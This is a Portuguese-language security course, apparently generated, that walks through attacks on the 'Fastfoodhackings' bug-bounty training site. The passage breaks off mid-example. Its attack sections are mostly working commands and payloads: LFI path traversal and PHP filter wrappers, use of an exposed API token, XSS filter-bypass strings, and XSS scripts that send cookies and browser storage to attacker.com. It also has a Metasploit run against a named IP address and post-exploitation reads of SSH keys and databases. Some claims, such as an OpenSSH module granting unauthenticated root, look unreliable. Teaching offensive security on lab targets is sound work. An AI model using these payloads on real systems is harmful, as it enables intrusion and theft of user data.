# 📚 Curso Completo: Extração de Dados e Escalação de Privilégios
## Análise de Vulnerabilidades - Fastfoodhackings

---

## 📑 ÍNDICE DO CURSO - Estrutura Modular

### 🎯 **MÓDULO 1: Fundamentos de Segurança e Vulnerabilidades** (INICIANTE)
- O que são vulnerabilidades de segurança?
- Conceitos básicos: CVSS, Severidade, Impacto
- Tipos de vulnerabilidades: LFI, XSS, RCE, etc.
- O que é extração de dados?
- O que é escalação de privilégios?
- **Exercícios Práticos**

### 🔍 **MÓDULO 2: Extração de Dados - Conceitos e Técnicas** (BÁSICO)
- O que é extração de dados?
- Tipos de dados sensíveis
- Técnicas de extração: LFI, API expostas, XSS
- Casos reais de extração
- **Exercícios Práticos**

### ⬆️ **MÓDULO 3: Escalação de Privilégios - Fundamentos** (BÁSICO)
- O que é escalação de privilégios?
- Níveis de privilégio: usuário → admin → root
- Técnicas de escalação: RCE, roubo de sessão, bypass
- Cenários de escalação
- **Exercícios Práticos**

### 🚨 **MÓDULO 4: Vulnerabilidades Críticas - LFI e SSH** (INTERMEDIÁRIO)
- FFHK-013: Local File Inclusion (LFI)
  - Como funciona LFI?
  - Técnicas de exploração
  - Log Poisoning para RCE
  - PHP Wrappers
- FFHK-009: Vulnerabilidades SSH (CVE-2023-38408)
  - O que é RCE?
  - Exploração via Metasploit
  - Impacto crítico
- **Exercícios Práticos**

### 🔴 **MÓDULO 5: Vulnerabilidades de Alto Risco** (INTERMEDIÁRIO)
- FFHK-003: Cross-Site Scripting (XSS)
  - Tipos de XSS
  - Payloads e técnicas
  - Roubo de sessões
- FFHK-006: API Token Exposto
  - Tokens e autenticação
  - Impacto de tokens expostos
- FFHK-014: Exposição de Parâmetros de Autenticação
  - Brute force attacks
  - Enumeração de usuários
- **Exercícios Práticos**

### 🚨 **MÓDULO 5B: Outros Tipos de Ataques** (INTERMEDIÁRIO)
- Denial of Service (DoS)
  - FFHK-012: Apache Byterange DoS
  - FFHK-010: nginx Buffer Overflow
  - FFHK-011: nginx DNS Resolver
  - Como funcionam ataques DoS
  - Impacto e mitigação
- Authentication Bypass
  - FFHK-009: SSH RCE (bypass completo)
  - FFHK-006: API Token (bypass de autenticação)
  - FFHK-014: Auth Params (manipulação)
  - Técnicas de bypass
- Man-in-the-Middle (MITM)
  - FFHK-011: DNS Cache Poisoning
  - FFHK-001: Origin IP Exposed
  - FFHK-004: Open Redirect
  - Como funcionam ataques MITM
  - Interceptação de comunicações
- **Exercícios Práticos**

### 🔗 **MÓDULO 6: Cadeias de Ataque (Attack Chains)** (AVANÇADO)
- O que são cadeias de ataque?
- Cadeia 1: LFI → RCE → Escalação
- Cadeia 2: XSS → Roubo de Sessão → Escalação
- Cadeia 3: SSH RCE → Controle Total
- Cadeia 4: API Token → Acesso Privilegiado
- Como combinar vulnerabilidades
- **Exercícios Práticos**

### 📊 **MÓDULO 7: Análise de Impacto e Priorização** (AVANÇADO)
- Sistema CVSS (Common Vulnerability Scoring System)
- Classificação de severidade
- Matriz de risco
- Priorização de correções
- Análise de impacto real
- **Exercícios Práticos**

### 🛡️ **MÓDULO 8: Mitigação e Correção de Vulnerabilidades** (EXPERT)
- Estratégias de mitigação
- Correções técnicas específicas
- Boas práticas de segurança
- Implementação de controles
- Monitoramento e detecção
- **Exercícios Práticos**

---

## 🎓 COMO USAR ESTE CURSO

Este curso foi estruturado de forma **progressiva**, do básico ao avançado. Cada módulo:
- ✅ Explica conceitos de forma simples e detalhada
- ✅ Usa analogias do mundo real
- ✅ Fornece exemplos práticos
- ✅ Inclui exercícios ao final

**IMPORTANTE:** Vamos explorar **UM MÓDULO POR VEZ**. Após cada módulo, você terá a oportunidade de fazer perguntas antes de continuar.

---

**Pronto para começar? Vamos ao Módulo 1! 🚀**

---

# 🎯 MÓDULO 1: Fundamentos de Segurança e Vulnerabilidades
## Nível: INICIANTE

---

## 📖 1.1 - O que são Vulnerabilidades de Segurança?

### Conceito Básico

Imagine que você tem uma **casa** (sistema/aplicação). Uma **vulnerabilidade** é como uma **janela quebrada**, uma **porta sem tranca**, ou uma **chave escondida embaixo do tapete**. São falhas que permitem que pessoas não autorizadas acessem ou causem danos.

**Definição Técnica:**
Uma vulnerabilidade é uma **fraqueza** em um sistema, aplicação ou processo que pode ser **explorada** por um atacante para:
- Acessar dados não autorizados
- Modificar informações
- Interromper serviços
- Obter controle do sistema

### Analogia do Mundo Real

Pense em um **banco**:
- ✅ **Seguro:** Portas reforçadas, câmeras, alarmes (proteções)
- ❌ **Vulnerabilidade:** Um cofre com senha "1234" (fraqueza)
- 🎯 **Exploração:** Um ladrão descobre a senha e abre o cofre (ataque)

### Exemplo Prático do Fastfoodhackings

No nosso caso de estudo, encontramos vulnerabilidades como:
- **FFHK-013 (LFI):** Como uma porta que permite acessar qualquer arquivo do sistema
- **FFHK-009 (SSH RCE):** Como uma fechadura quebrada que permite entrar sem chave
- **FFHK-003 (XSS):** Como um sistema de segurança que aceita instruções falsas

---

## 📊 1.2 - Sistema de Classificação: CVSS

### O que é CVSS?

**CVSS** = **Common Vulnerability Scoring System** (Sistema Comum de Pontuação de Vulnerabilidades)

É como uma **escala de 0 a 10** que mede o quão **perigosa** é uma vulnerabilidade.

### Analogia: Escala de Terremotos

Assim como terremotos têm escalas (Richter), vulnerabilidades têm CVSS:
- **0.0 - 3.9:** 🟢 **BAIXO** - Como um tremor leve (pouco dano)
- **4.0 - 6.9:** 🟡 **MÉDIO** - Como um terremoto moderado (dano considerável)
- **7.0 - 8.9:** 🔴 **ALTO** - Como um terremoto forte (dano severo)
- **9.0 - 10.0:** 🟥 **CRÍTICO** - Como um terremoto devastador (destruição total)

### Exemplo do Nosso Relatório

```
FFHK-009: CVSS 9.8 (CRÍTICO)
FFHK-013: CVSS 9.1 (CRÍTICO)
FFHK-003: CVSS 8.8 (ALTO)
FFHK-006: CVSS 8.5 (ALTO)
```

### Componentes do CVSS

O CVSS avalia três aspectos:

1. **Confidencialidade (C):** Quanto de informação pode ser vazada?
   - **Nenhuma (N)**
   - **Baixa (L)**
   - **Alta (H)**

2. **Integridade (I):** Quanto de informação pode ser modificada?
   - **Nenhuma (N)**
   - **Baixa (L)**
   - **Alta (H)**

3. **Disponibilidade (A):** Quanto o serviço pode ser interrompido?
   - **Nenhuma (N)**
   - **Baixa (L)**
   - **Alta (H)**

**Exemplo:**
```
CVSS 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

AV:N = Ataque via Rede (Network)
AC:L = Complexidade Baixa (Low)
PR:N = Sem Privilégios Necessários (None)
UI:N = Sem Interação do Usuário (None)
S:U = Escopo Não Alterado (Unchanged)
C:H = Confidencialidade ALTA (High) ⚠️
I:H = Integridade ALTA (High) ⚠️
A:N = Disponibilidade Nenhuma (None)
```

---

## 🏷️ 1.3 - Níveis de Severidade

### Classificação por Cores

No nosso relatório, usamos um sistema visual:

| Severidade | Emoji | Significado | CVSS |
|------------|-------|-------------|------|
| **CRITICAL** | 🟥 | Crítico - Ação imediata | 9.0 - 10.0 |
| **HIGH** | 🔴 | Alto - Correção urgente | 7.0 - 8.9 |
| **MEDIUM** | 🟡 | Médio - Correção importante | 4.0 - 6.9 |
| **LOW** | 🟢 | Baixo - Correção recomendada | 0.1 - 3.9 |

### Analogia: Sistema de Alerta de Tempestade

- 🟥 **CRITICAL:** Tempestade severa chegando em minutos - EVACUAR AGORA!
- 🔴 **HIGH:** Tempestade forte chegando em horas - PREPARAR-SE!
- 🟡 **MEDIUM:** Chuva forte prevista - FICAR ATENTO
- 🟢 **LOW:** Possibilidade de chuva - MONITORAR

---

## 🔍 1.4 - Tipos de Vulnerabilidades (Visão Geral)

Vamos conhecer os principais tipos que aparecem no nosso relatório:

### 1. **LFI (Local File Inclusion) - FFHK-013**

**O que é?**
Permite ler arquivos do servidor que não deveriam ser acessíveis.

**Analogia:**
Como ter uma chave mestra que abre TODAS as portas de um prédio, incluindo salas privadas.

**Exemplo Simples:**
```
Normal: /api/loader.php?f=reviews.php (arquivo permitido)
Ataque: /api/loader.php?f=/etc/passwd (arquivo do sistema!)
```

### 2. **XSS (Cross-Site Scripting) - FFHK-003**

**O que é?**
Permite injetar código JavaScript malicioso em páginas web.

**Analogia:**
Como conseguir colocar um "gravador escondido" em uma reunião para ouvir conversas privadas.

**Exemplo Simples:**
```
Input normal: "João Silva"
Input malicioso: "<script>alert('Hacked!')</script>"
```

### 3. **RCE (Remote Code Execution) - FFHK-009**

**O que é?**
Permite executar comandos no servidor remotamente.

**Analogia:**
Como conseguir controlar o computador de outra pessoa à distância, como se você estivesse sentado na frente dele.

**Exemplo Simples:**
```
Ataque: Executar "whoami" no servidor
Resultado: Descobrir que você tem acesso como "root"
```

### 4. **Token Exposto - FFHK-006**

**O que é?**
Credenciais ou chaves de acesso visíveis no código-fonte.

**Analogia:**
Como deixar a senha do Wi-Fi escrita em um papel colado na parede.

**Exemplo Simples:**
```javascript
// Código JavaScript exposto:
const API_TOKEN = "c0f22cf8-96ea-4fbb-8805-ee4246095031";
// Qualquer um pode ver isso no navegador!
```

### 5. **SSH Vulnerável - FFHK-009**

**O que é?**
Serviço SSH (acesso remoto) com falhas de segurança conhecidas.

**Analogia:**
Como uma fechadura de porta que tem um defeito conhecido, permitindo que qualquer chave abra.

### 6. **DoS (Denial of Service) - FFHK-012, FFHK-010, FFHK-011**

**O que é?**
Ataques que tornam serviços indisponíveis ou degradam sua performance.

**Analogia:**
Como bloquear a entrada de um prédio com muitas pessoas, impedindo que ninguém entre ou saia.

**Exemplo Simples:**
```
Ataque: Enviar muitas requisições simultâneas
Resultado: Servidor fica sobrecarregado e para de responder
```

### 7. **Authentication Bypass - FFHK-009, FFHK-006, FFHK-014**

**O que é?**
Técnicas para contornar mecanismos de autenticação sem credenciais válidas.

**Analogia:**
Como encontrar uma forma de entrar em um prédio sem precisar de chave ou cartão de acesso.

**Exemplo Simples:**
```
Normal: Precisa de usuário e senha para acessar
Bypass: Usar token exposto ou explorar vulnerabilidade para acessar sem login
```

### 8. **Man-in-the-Middle (MITM) - FFHK-011, FFHK-001, FFHK-004**

**O que é?**
Ataques onde o atacante intercepta comunicações entre duas partes.

**Analogia:**
Como alguém que intercepta cartas no correio, lê o conteúdo e depois reenvia, sem que ninguém perceba.

**Exemplo Simples:**
```
Normal: Usuário ↔ Servidor (comunicação direta)
MITM: Usuário ↔ Atacante ↔ Servidor (atacante intercepta tudo)
```

---

## 📦 1.5 - O que é Extração de Dados?

### Conceito

**Extração de dados** é o processo de **obter informações sensíveis** que não deveriam ser acessíveis.

### Analogia: Roubo de Informações

Imagine um **cofre de banco**:
- ✅ **Normal:** Apenas gerentes autorizados podem abrir
- ❌ **Vulnerabilidade:** Cofre com senha fraca
- 🎯 **Extração:** Atacante descobre senha e **extrai** dinheiro/dados

### Tipos de Dados que Podem Ser Extraídos

1. **Credenciais:**
   - Senhas de banco de dados
   - Chaves de API
   - Tokens de autenticação

2. **Dados de Usuários:**
   - Informações pessoais
   - Histórico de transações
   - Dados de reservas

3. **Arquivos do Sistema:**
   - Arquivos de configuração
   - Código-fonte
   - Logs do sistema

4. **Informações de Sessão:**
   - Cookies
   - Tokens de sessão
   - Headers de autenticação

### Exemplo Real do Relatório

**FFHK-013 (LFI) permite extrair:**
```
✅ /etc/passwd (lista de usuários do sistema)
✅ config.php (credenciais de banco de dados)
✅ .env (variáveis de ambiente sensíveis)
✅ /var/log/nginx/access.log (logs do servidor)
```

---

## ⬆️ 1.6 - O que é Escalação de Privilégios?

### Conceito

**Escalação de privilégios** é o processo de **obter mais permissões** do que você deveria ter.

### Analogia: Hierarquia de Acesso

Pense em um **prédio corporativo**:

```
👤 Visitante (sem acesso)
   ↓ Escalação
👨‍💼 Funcionário (acesso ao andar 1)
   ↓ Escalação
👔 Gerente (acesso aos andares 1-5)
   ↓ Escalação
👑 Diretor (acesso total + cofre)
```

### Níveis de Privilégio em Sistemas

1. **Usuário Normal:**
   - Pode acessar apenas seus próprios dados
   - Permissões limitadas

2. **Administrador:**
   - Pode gerenciar usuários
   - Pode modificar configurações
   - Acesso amplo à aplicação

3. **Root/Superusuário:**
   - Controle total do servidor
   - Pode fazer qualquer coisa
   - Acesso a todos os arquivos e processos

### Exemplo Real do Relatório

**FFHK-009 (SSH RCE) permite:**
```
1. Acesso inicial: Nenhum (sem autenticação)
   ↓ Exploração
2. Escalação: Acesso root direto
   ↓ Resultado
3. Controle total do servidor
```

**FFHK-003 (XSS) permite:**
```
1. Acesso inicial: Usuário normal
   ↓ Roubo de sessão de admin
2. Escalação: Acesso como administrador
   ↓ Resultado
3. Controle da aplicação
```

---

## 🎯 1.7 - Relação entre Extração e Escalação

### Como se Relacionam?

Muitas vezes, **extração de dados** leva à **escalação de privilégios**:

**Cenário Real:**
```
1. Extração: Atacante extrai credenciais de admin via LFI
   ↓
2. Uso: Atacante usa credenciais para fazer login como admin
   ↓
3. Escalação: Agora tem privilégios de administrador!
```

**Exemplo do Relatório - Cadeia de Ataque:**
```
FFHK-013 (LFI) 
  → Extrai config.php (credenciais)
  → Usa credenciais para acessar banco de dados
  → Modifica dados de usuários
  → Escalação de privilégios!
```

---

## 📝 RESUMO DO MÓDULO 1

### Conceitos Aprendidos:

✅ **Vulnerabilidade:** Fraqueza que pode ser explorada  
✅ **CVSS:** Sistema de pontuação (0-10) para medir perigo  
✅ **Severidade:** CRITICAL, HIGH, MEDIUM, LOW  
✅ **Tipos Comuns:** LFI, XSS, RCE, Tokens Expostos  
✅ **Extração de Dados:** Obter informações não autorizadas  
✅ **Escalação de Privilégios:** Obter mais permissões do que deveria  

### Próximos Passos:

No **Módulo 2**, vamos aprofundar em **Extração de Dados** - como funciona, técnicas específicas e casos reais do relatório.

---

## 🏋️ EXERCÍCIOS PRÁTICOS - MÓDULO 1

### Exercício 1: Classificação de Severidade

Classifique as seguintes vulnerabilidades por severidade:

a) Vulnerabilidade que permite ler arquivos do sistema (CVSS 9.1)  
b) Vulnerabilidade que expõe token de API (CVSS 8.5)  
c) Vulnerabilidade que permite enumeração de usuários (CVSS 6.5)  

**Resposta:**
- a) 🟥 **CRITICAL** (CVSS 9.1)
- b) 🔴 **HIGH** (CVSS 8.5)
- c) 🟡 **MEDIUM** (CVSS 6.5)

---

### Exercício 2: Identificação de Tipos

Identifique o tipo de vulnerabilidade:

a) Permite executar comandos no servidor remotamente  
b) Permite ler arquivos do sistema via URL  
c) Permite injetar JavaScript em páginas web  
d) Credencial visível no código JavaScript  
e) Permite tornar serviços indisponíveis  
f) Permite contornar autenticação sem credenciais  
g) Permite interceptar comunicações entre usuário e servidor  

**Resposta:**
- a) **RCE** (Remote Code Execution)
- b) **LFI** (Local File Inclusion)
- c) **XSS** (Cross-Site Scripting)
- d) **Token Exposto**
- e) **DoS** (Denial of Service)
- f) **Authentication Bypass**
- g) **MITM** (Man-in-the-Middle)

---

### Exercício 3: Analogia

Complete a analogia:

"Uma vulnerabilidade LFI é como ter uma chave mestra que..."

**Resposta Sugerida:**
"...abre TODAS as portas de um prédio, permitindo acessar salas privadas, cofres e documentos confidenciais que não deveriam ser acessíveis."

---

### Exercício 4: Escalação de Privilégios

Descreva os níveis de privilégio em ordem crescente:

**Resposta:**
1. **Usuário Normal** - Acesso limitado aos próprios dados
2. **Administrador** - Acesso amplo à aplicação
3. **Root/Superusuário** - Controle total do servidor

---

### Exercício 5: Relação entre Conceitos

Explique como extração de dados pode levar à escalação de privilégios:

**Resposta Sugerida:**
"Quando um atacante extrai credenciais de administrador (extração de dados), ele pode usar essas credenciais para fazer login como admin (escalação de privilégios), obtendo assim acesso a funcionalidades que não teria como usuário normal."

---

## ✅ MÓDULO 1 CONCLUÍDO!

Parabéns! Você completou o Módulo 1 - Fundamentos de Segurança e Vulnerabilidades.

**Você agora entende:**
- ✅ O que são vulnerabilidades
- ✅ Como são classificadas (CVSS, Severidade)
- ✅ Tipos principais de vulnerabilidades
- ✅ Conceitos de extração de dados e escalação de privilégios

---

## ❓ TEM ALGUMA PERGUNTA?

Antes de continuarmos para o **Módulo 2: Extração de Dados - Conceitos e Técnicas**, você tem alguma dúvida sobre o Módulo 1?

**Quando estiver pronto, me avise e continuamos! 🚀**

---

# 🔍 MÓDULO 2: Extração de Dados - Conceitos e Técnicas
## Nível: BÁSICO

---

## 📖 2.1 - O que é Extração de Dados? (Aprofundamento)

### Conceito Detalhado

**Extração de dados** é o processo de **obter informações sensíveis** de um sistema ou aplicação **sem autorização**. É como "roubar" informações que não deveriam ser acessíveis.

### Analogia: Biblioteca com Arquivos Confidenciais

Imagine uma **biblioteca** com diferentes seções:

```
📚 Seção Pública (Acesso Livre)
   - Livros gerais, jornais, revistas
   
🔒 Seção Restrita (Acesso Controlado)
   - Documentos confidenciais
   - Registros pessoais
   - Informações financeiras
   
🚫 Arquivo Secreto (Acesso Proibido)
   - Senhas e credenciais
   - Chaves de segurança
   - Dados sensíveis do sistema
```

**Extração de dados** é como encontrar uma forma de acessar as seções **Restritas** e **Secretas** sem permissão.

### Por que é Perigoso?

A extração de dados pode levar a:
- 🚨 **Violação de Privacidade:** Dados pessoais expostos
- 🚨 **Roubo de Identidade:** Credenciais comprometidas
- 🚨 **Fraude Financeira:** Informações bancárias acessadas
- 🚨 **Espionagem Corporativa:** Segredos comerciais vazados
- 🚨 **Escalação de Privilégios:** Dados extraídos usados para obter mais acesso

---

## 📦 2.2 - Tipos de Dados Sensíveis

### Categoria 1: Credenciais e Autenticação

**O que são?**
Informações usadas para provar identidade e obter acesso.

**Exemplos:**
- 🔑 **Senhas:** Hash de senhas, senhas em texto plano
- 🎫 **Tokens de API:** Chaves de acesso a serviços
- 🎟️ **Tokens de Sessão:** Cookies, JWT tokens
- 🔐 **Chaves SSH:** Chaves privadas para acesso remoto
- 📝 **Certificados:** Certificados SSL/TLS

**Por que são perigosos?**
```
Senha extraída → Login não autorizado → Acesso à conta
Token extraído → Acesso a APIs → Dados expostos
Chave SSH extraída → Acesso ao servidor → Controle total
```

**Exemplo Real (FFHK-006):**
```javascript
// Token exposto no JavaScript:
const API_TOKEN = "c0f22cf8-96ea-4fbb-8805-ee4246095031";
// Qualquer um pode ver e usar este token!
```

---

### Categoria 2: Dados Pessoais (PII - Personally Identifiable Information)

**O que são?**
Informações que identificam uma pessoa específica.

**Exemplos:**
- 👤 **Informações Básicas:** Nome, email, telefone, endereço
- 🆔 **Documentos:** CPF, RG, passaporte
- 💳 **Dados Financeiros:** Número de cartão, conta bancária
- 📊 **Histórico:** Compras, reservas, transações
- 🏥 **Dados de Saúde:** Prontuários, exames

**Por que são perigosos?**
```
Dados pessoais extraídos → Roubo de identidade → Fraude
Histórico de compras → Perfil de comportamento → Marketing abusivo
Dados financeiros → Fraude bancária → Perda financeira
```

**Exemplo Real (FFHK-006):**
```bash
# Extração de dados de usuários via API token exposto
curl -H "Authorization: Bearer c0f22cf8-96ea-4fbb-8805-ee4246095031" \
     "https://www.bugbountytraining.com/fastfoodhackings/api/invites.php"
# Retorna: Lista de convites com dados de usuários
```

---

### Categoria 3: Arquivos do Sistema

**O que são?**
Arquivos do servidor que contêm configurações e informações do sistema.

**Exemplos:**
- ⚙️ **Arquivos de Configuração:** `config.php`, `.env`, `database.php`
- 📋 **Arquivos do Sistema:** `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
- 💻 **Código-Fonte:** Arquivos PHP, JavaScript, Python
- 📝 **Logs:** Logs de acesso, logs de erro, logs de aplicação
- 🔑 **Chaves e Certificados:** Chaves SSH, certificados SSL

**Por que são perigosos?**
```
config.php extraído → Credenciais de banco de dados → Acesso ao banco
/etc/passwd extraído → Lista de usuários → Enumeração
Código-fonte extraído → Análise de vulnerabilidades → Novos ataques
```

**Exemplo Real (FFHK-013 - LFI):**
```bash
# Extração de arquivo de configuração
/api/loader.php?f=config.php
# Retorna: Credenciais de banco de dados, chaves de API, etc.
```

---

### Categoria 4: Informações de Sessão

**O que são?**
Dados que mantêm o estado de uma sessão de usuário.

**Exemplos:**
- 🍪 **Cookies:** Cookies de sessão, cookies de autenticação
- 🎫 **Tokens de Sessão:** Session IDs, JWT tokens
- 💾 **LocalStorage/SessionStorage:** Dados armazenados no navegador
- 📨 **Headers:** Headers de autenticação, CSRF tokens

**Por que são perigosos?**
```
Cookie de sessão roubado → Acesso à conta sem senha → Controle da conta
Token JWT roubado → Acesso a APIs protegidas → Dados expostos
```

**Exemplo Real (FFHK-003 - XSS):**
```javascript
// Payload XSS para roubar cookies
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
// Resultado: Cookie de sessão enviado para atacante
```

---

## 🛠️ 2.3 - Técnicas de Extração de Dados

### Técnica 1: Local File Inclusion (LFI) - FFHK-013

**Como funciona?**
A aplicação permite incluir arquivos do servidor através de parâmetros manipuláveis.

**Analogia:**
Como ter uma chave mestra que abre qualquer porta de um prédio, permitindo acessar salas privadas, cofres e arquivos confidenciais.

**Passo a Passo:**
```
1. Identificar parâmetro vulnerável
   Exemplo: /api/loader.php?f=reviews.php

2. Tentar acessar arquivo do sistema
   Exemplo: /api/loader.php?f=/etc/passwd

3. Se funcionar, explorar diferentes arquivos
   - Arquivos de configuração
   - Arquivos do sistema
   - Logs
   - Código-fonte
```

**Comandos Práticos:**
```bash
# Teste básico
curl "https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=/etc/passwd"

# Path traversal (subir diretórios)
curl "https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=../../../etc/passwd"

# Acesso a arquivo de configuração
curl "https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=config.php"

# PHP Wrapper (bypass de filtros)
curl "https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=php://filter/convert.base64-encode/resource=config.php"
```

**O que pode ser extraído?**
- ✅ Arquivos do sistema (`/etc/passwd`, `/etc/shadow`)
- ✅ Arquivos de configuração (`config.php`, `.env`)
- ✅ Código-fonte (todos os arquivos PHP)
- ✅ Logs do sistema
- ✅ Chaves SSH

**Impacto Real:**
```
FFHK-013 permite extrair:
→ Credenciais de banco de dados (config.php)
→ Lista de usuários do sistema (/etc/passwd)
→ Código-fonte completo da aplicação
→ Potencial para RCE via log poisoning
```

---

### Técnica 2: Exposição de Tokens/Credenciais - FFHK-006

**Como funciona?**
Credenciais ou tokens são expostos em código-fonte, JavaScript, ou respostas de API.

**Analogia:**
Como deixar a senha do Wi-Fi escrita em um papel colado na parede - qualquer um que passar pode ver e usar.

**Passo a Passo:**
```
1. Analisar código-fonte (HTML, JavaScript)
   Exemplo: Verificar arquivos .js no navegador

2. Procurar por padrões de credenciais
   - Tokens de API
   - Chaves de acesso
   - Senhas hardcoded

3. Extrair e usar as credenciais
   - Fazer requisições não autorizadas
   - Acessar endpoints protegidos
```

**Comandos Práticos:**
```bash
# Extrair token de arquivo JavaScript
curl -s "https://www.bugbountytraining.com/fastfoodhackings/js/script.min.js" | \
grep -o "[a-f0-9-]\{36\}"

# Usar token para acessar API
curl -H "Authorization: Bearer c0f22cf8-96ea-4fbb-8805-ee4246095031" \
     "https://www.bugbountytraining.com/fastfoodhackings/api/invites.php"

# Extrair dados de usuários
curl -H "Authorization: Bearer c0f22cf8-96ea-4fbb-8805-ee4246095031" \
     "https://www.bugbountytraining.com/fastfoodhackings/api/book.php"
```

**O que pode ser extraído?**
- ✅ Dados de usuários (via APIs)
- ✅ Informações de reservas
- ✅ Dados administrativos (se token tiver privilégios)
- ✅ Qualquer dado acessível via API

**Impacto Real:**
```
FFHK-006 permite extrair:
→ Token: c0f22cf8-96ea-4fbb-8805-ee4246095031
→ Acesso não autorizado a todas as APIs
→ Dados de usuários e reservas
→ Potencial acesso administrativo
```

---

### Técnica 3: Cross-Site Scripting (XSS) - FFHK-003

**Como funciona?**
Código JavaScript malicioso é injetado em páginas web, permitindo roubar informações do navegador.

**Analogia:**
Como colocar um "gravador escondido" em uma reunião - você ouve tudo que é dito sem que ninguém perceba.

**Passo a Passo:**
```
1. Identificar parâmetro vulnerável
   Exemplo: ?act=<script>alert('XSS')</script>

2. Criar payload malicioso
   Exemplo: Roubo de cookies, extração de dados

3. Injetar payload e aguardar vítima
   - Vítima visita página
   - Payload executa
   - Dados são enviados para atacante
```

**Comandos Práticos:**
```bash
# Teste básico de XSS
curl "https://www.bugbountytraining.com/fastfoodhackings/index.php?act=<script>alert('XSS')</script>"

# Payload para roubar cookies
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

# Payload para extrair dados do navegador
<script>
fetch('http://attacker.com/steal.php', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
  })
});
</script>
```

**O que pode ser extraído?**
- ✅ Cookies e tokens de sessão
- ✅ Dados do LocalStorage/SessionStorage
- ✅ Credenciais via formulários de phishing
- ✅ Headers e informações do navegador

**Payloads Confirmados (FFHK-003):**
```html
1. <HTmL%0aonMoUsEoVer%0a=%0aconfirm()> - 100% efficiency
2. <DEtails/+/oNtoGGlE%0a=%0a(confirm)()%0dx// - 92% efficiency
3. <html/+/oNPoinTEReNTER%09=%09a=prompt,a()> - 96% efficiency
4. <A/+/onPoINTeRENTer%09=%09(confirm)()>v3dm0s - 96% efficiency
5. <dETails%09OnpOInterENTeR%0d=%0da=prompt,a()> - 100% efficiency
```

**Impacto Real:**
```
FFHK-003 permite extrair:
→ Cookies de sessão de administradores
→ Tokens de autenticação
→ Dados armazenados no navegador
→ Potencial roubo de identidade
```

---

### Técnica 4: Remote Code Execution (RCE) - FFHK-009

**Como funciona?**
Execução de comandos no servidor permite acessar diretamente arquivos e dados.

**Analogia:**
Como ter controle total de um computador remoto - você pode abrir qualquer arquivo, executar qualquer comando, acessar qualquer dado.

**Passo a Passo:**
```
1. Explorar vulnerabilidade RCE
   Exemplo: CVE-2023-38408 no SSH

2. Obter shell no servidor
   Exemplo: Acesso root via Metasploit

3. Extrair dados diretamente
   - Ler arquivos do sistema
   - Acessar bancos de dados
   - Copiar arquivos sensíveis
```

**Comandos Práticos:**
```bash
# Exploração via Metasploit
msf6 > use exploit/linux/ssh/openssh_cve_2023_38408
msf6 > set RHOSTS 134.209.18.185
msf6 > exploit

# Após RCE - Extração de dados
# Acesso a arquivos de configuração
cat /var/www/html/config.php

# Acesso a banco de dados
mysql -u root -p -e "SELECT * FROM users;"

# Extração de chaves SSH
cat ~/.ssh/id_rsa

# Listar arquivos sensíveis
find /var/www -name "*.php" -type f
```

**O que pode ser extraído?**
- ✅ **TODOS** os dados do servidor
- ✅ Bancos de dados completos
- ✅ Arquivos de configuração
- ✅ Código-fonte completo
- ✅ Logs e histórico

**Impacto Real:**
```
FFHK-009 permite extrair:
→ Acesso root completo ao servidor
→ Todos os bancos de dados
→ Todos os arquivos do sistema
→ Controle total = acesso a tudo
```

---

## 📊 2.4 - Casos Reais do Relatório Fastfoodhackings

### Caso 1: Extração de Credenciais via LFI (FFHK-013)

**Cenário:**
```
Atacante descobre vulnerabilidade LFI em /api/loader.php
→ Acessa config.php
→ Extrai credenciais de banco de dados
→ Usa credenciais para acessar banco
→ Extrai todos os dados de usuários
```

**Comandos Executados:**
```bash
# Passo 1: Acessar config.php
curl "https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=config.php"

# Resultado: Credenciais expostas
# DB_HOST=localhost
# DB_USER=fastfood_user
# DB_PASS=SuperSecretPassword123
# DB_NAME=fastfood_db

# Passo 2: Usar credenciais para acessar banco
mysql -h localhost -u fastfood_user -pSuperSecretPassword123 fastfood_db

# Passo 3: Extrair dados
SELECT * FROM users;
SELECT * FROM reservations;
SELECT * FROM payments;
```

**Dados Extraídos:**
- ✅ Credenciais de banco de dados
- ✅ Dados de todos os usuários
- ✅ Histórico de reservas
- ✅ Informações de pagamento

---

### Caso 2: Extração de Dados via Token Exposto (FFHK-006)

**Cenário:**
```
Atacante analisa código JavaScript
→ Encontra token de API exposto
→ Usa token para acessar APIs
→ Extrai dados de usuários e reservas
```

**Comandos Executados:**
```bash
# Passo 1: Extrair token
curl -s "https://www.bugbountytraining.com/fastfoodhackings/js/script.min.js" | \
grep -o "[a-f0-9-]\{36\}"

# Resultado: c0f22cf8-96ea-4fbb-8805-ee4246095031

# Passo 2: Usar token para extrair dados
curl -H "Authorization: Bearer c0f22cf8-96ea-4fbb-8805-ee4246095031" \
     "https://www.bugbountytraining.com/fastfoodhackings/api/invites.php"

# Resultado: Lista de convites com dados de usuários
[
  {"user_id": 1, "email": "user1@example.com", "invite_code": "ABC123"},
  {"user_id": 2, "email": "user2@example.com", "invite_code": "XYZ789"},
  ...
]

# Passo 3: Extrair informações de reservas
curl -H "Authorization: Bearer c0f22cf8-96ea-4fbb-8805-ee4246095031" \
     "https://www.bugbountytraining.com/fastfoodhackings/api/book.php"
```

**Dados Extraídos:**
- ✅ Lista de usuários e emails
- ✅ Códigos de convite
- ✅ Informações de reservas
- ✅ Dados administrativos (se token tiver privilégios)

---

### Caso 3: Roubo de Sessão via XSS (FFHK-003)

**Cenário:**
```
Atacante injeta payload XSS em página
→ Admin visita página
→ Cookie de sessão é roubado
→ Atacante usa cookie para acessar como admin
→ Extrai dados administrativos
```

**Comandos Executados:**
```html
<!-- Payload XSS injetado -->
<script>
fetch('http://attacker.com/steal.php', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent
  })
});
</script>

<!-- Admin visita página → Cookie enviado para atacante -->
<!-- Atacante recebe: session_id=abc123xyz; admin_token=def456uvw -->

<!-- Atacante usa cookie roubado -->
curl -H "Cookie: session_id=abc123xyz; admin_token=def456uvw" \
     "https://www.bugbountytraining.com/fastfoodhackings/admin/dashboard.php"

